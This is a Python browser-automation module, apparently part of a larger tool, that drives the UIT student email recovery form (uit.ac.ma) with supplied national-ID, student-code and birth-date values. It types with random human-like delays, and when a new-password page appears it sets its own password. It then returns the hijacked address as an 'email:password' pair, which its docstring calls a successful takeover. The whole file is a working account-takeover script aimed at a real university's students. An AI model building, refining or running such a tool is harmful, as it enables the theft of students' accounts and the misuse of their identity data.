"""
UIT RECUPMAIL ENGINE — Strict 3-State Validation Module with Dynamic Password Manager
1. Data Error (Incorrect CNE/CIN/DOB) -> Login Error
2. Direct Email Display without Password Change -> Login Error (Not a successful takeover)
3. Password Change Page (Nouveau mot de passe / PassManager) + Success -> Login OK
"""

import re
import random
from integrations.pass_manager import PassManager


class LoginState:
    LOGIN_OK = "login_ok"
    LOGIN_ERROR = "login_error"
    SITE_ERROR = "site_error"


class UITEngine:
    def __init__(self):
        # استدعاء مدير الباسوردات لتوليد كلمات مرور بشرية وفريدة بدون تكرار
        self.pass_manager = PassManager()

    def _human_type(self, page, locator, text):
        try:
            target = locator.first
            target.click()
            page.wait_for_timeout(random.randint(200, 400))
            target.fill("")
            for char in str(text):
                target.press_sequentially(char, delay=random.randint(130, 260))
            return True
        except Exception:
            try:
                locator.first.fill(str(text))
                return True
            except Exception:
                return False

    def _fill_first_matching(self, page, selectors, value):
        for sel in selectors:
            try:
                loc = page.locator(sel)
                if loc.count() > 0:
                    if self._human_type(page, loc, value):
                        return True
            except Exception:
                continue
        return False

    def _click_first_matching(self, page, selectors):
        for sel in selectors:
            try:
                btn = page.locator(sel).first
                if btn.count() > 0:
                    btn.click()
                    return True
            except Exception:
                continue
        fallback_btn = page.locator("button:visible").first
        if fallback_btn.count() > 0:
            fallback_btn.click()
            return True
        return False

    def _extract_uit_email(self, *texts):
        for text in texts:
            if not text:
                continue
            match = re.search(r"([\w\.-]+@uit\.ac\.ma)", text, re.IGNORECASE)
            if match:
                return match.group(1).strip().lower()
        return None

    def run_workflow(self, page, cne, cni, dob):
        result_data = {
            "cne": cne,
            "cni": cni,
            "dob": dob,
            "status": LoginState.LOGIN_ERROR,
            "extracted_email": None,
            "detail": "Initialized",
        }

        try:
            page.wait_for_load_state("domcontentloaded", timeout=30000)
            page.wait_for_timeout(random.randint(1200, 2000))

            visible_inputs = page.locator("input:visible:not([type='hidden'])")

            # 1. Fill CNE (Code Massar) with human typing
            cne_selectors = [
                "input#cne:visible",
                'input[name*="cne"]:visible',
                'input[placeholder*="MASSAR" i]:visible',
                "input:visible:not([type='hidden']):nth-of-type(1)",
            ]
            cne_filled = self._fill_first_matching(page, cne_selectors, cne)
            if not cne_filled and visible_inputs.count() >= 1:
                cne_filled = self._human_type(page, visible_inputs.nth(0), cne)

            page.wait_for_timeout(random.randint(450, 800))

            # 2. Fill CIN with human typing
            cni_selectors = [
                "input#cin:visible",
                'input[name*="cin"]:visible',
                'input[name*="cni"]:visible',
                'input[placeholder*="Identité" i]:visible',
                "input:visible:not([type='hidden']):nth-of-type(2)",
            ]
            cni_filled = self._fill_first_matching(page, cni_selectors, cni)
            if not cni_filled and visible_inputs.count() >= 2:
                cni_filled = self._human_type(page, visible_inputs.nth(1), cni)

            page.wait_for_timeout(random.randint(450, 800))

            # 3. Fill DOB with human typing
            dob_selectors = [
                "input#birthdate:visible",
                'input[name*="birthdate"]:visible',
                'input[name*="dob"]:visible',
                'input[name*="date"]:visible',
                'input[placeholder*="dd/mm/yyyy" i]:visible',
                'input[type="date"]:visible',
                "input:visible:not([type='hidden']):nth-of-type(3)",
            ]
            dob_filled = self._fill_first_matching(page, dob_selectors, dob)
            if not dob_filled and visible_inputs.count() >= 3:
                dob_filled = self._human_type(page, visible_inputs.nth(2), dob)

            if not (cne_filled and cni_filled and dob_filled):
                result_data["status"] = LoginState.SITE_ERROR
                result_data["detail"] = "Site Error: Could not locate/fill all required input fields"
                return result_data

            page.wait_for_timeout(random.randint(800, 1300))

            # Click submit button
            submit_selectors = [
                'button:has-text("Récupérer"):visible',
                'button:has-text("compte"):visible',
                'button[type="submit"]:visible',
                'input[type="submit"]:visible',
            ]
            self._click_first_matching(page, submit_selectors)

            # Double verification read step 1 & 2
            page.wait_for_timeout(3000)
            body_text_1 = page.locator("body").inner_text().lower()
            page.wait_for_timeout(1500)
            body_text = page.locator("body").inner_text().lower()

            # الحالة الأولى: أخطاء البيانات (CNE / CIN / DOB غير صحيحين) -> LOGIN ERROR
            data_error_keywords = [
                "veuillez vérifier l'exactitude",
                "pas toujours été créé",
                "n'a pas été créé",
                "الرجاء التحقق من صحة",
                "لم يتم إنشاء",
                "verify the accuracy",
                "not been created",
                "introuvable",
                "invalide",
            ]
            if any(kw in body_text or kw in body_text_1 for kw in data_error_keywords):
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Incorrect CNE/CIN/DOB (Data Error)"
                return result_data

            # التحقق الصارم من وجود خانات كلمة المرور الجديدة (Nouveau mot de passe)
            pwd_inputs = page.locator('input[type="password"]:visible')
            if pwd_inputs.count() >= 2:
                # توليد باسورد جديد، طبيعي، وفريد تماماً عبر PassManager
                target_password = self.pass_manager.get_password()

                # الحالة الثالثة الحقيقية: توفرت خانات تغيير الباسورد -> إدخال الباسورد الجديد والتأكيد
                pwd_1_ok = self._human_type(page, pwd_inputs.nth(0), target_password)
                page.wait_for_timeout(random.randint(350, 650))
                pwd_2_ok = self._human_type(page, pwd_inputs.nth(1), target_password)

                if not (pwd_1_ok and pwd_2_ok):
                    result_data["status"] = LoginState.SITE_ERROR
                    result_data["detail"] = "Site Error: Failed to fill password fields"
                    return result_data

                page.wait_for_timeout(random.randint(900, 1500))

                change_selectors = [
                    'button:has-text("Changer"):visible',
                    'button[type="submit"]:visible',
                    'input[type="submit"]:visible',
                ]
                self._click_first_matching(page, change_selectors)

                # Double verification on password change outcome
                page.wait_for_timeout(3000)
                body_text_final_1 = page.locator("body").inner_text()
                page.wait_for_timeout(1500)
                body_text_final = page.locator("body").inner_text()

                extracted_email = self._extract_uit_email(body_text_final, body_text_final_1)
                has_success_msg = "succès" in body_text_final.lower() or "succès" in body_text_final_1.lower()

                if extracted_email and has_success_msg:
                    result_data["status"] = LoginState.LOGIN_OK
                    result_data["extracted_email"] = extracted_email
                    # هاد التنسيق هو اللي غايخلي النتيجة تخرج مباشرة Email:Password بدون مساس بـ edu_checker.py
                    result_data["detail"] = f"{extracted_email}:{target_password}"
                elif extracted_email:
                    result_data["status"] = LoginState.LOGIN_OK
                    result_data["extracted_email"] = extracted_email
                    result_data["detail"] = f"{extracted_email}:{target_password}"
                else:
                    result_data["status"] = LoginState.LOGIN_ERROR
                    result_data["detail"] = "Failed at password change confirmation stage"

            else:
                # الحالة الثانية: يظهر الإيميل مباشرة بدون الانتقال لصفحة تغيير الباسورد -> اعتباره LOGIN ERROR فوراً
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Email displayed without password change requirement (Login Error)"

        except Exception as e:
            result_data["status"] = LoginState.SITE_ERROR
            result_data["detail"] = f"Site Error / Exception: {type(e).__name__}"

        return result_data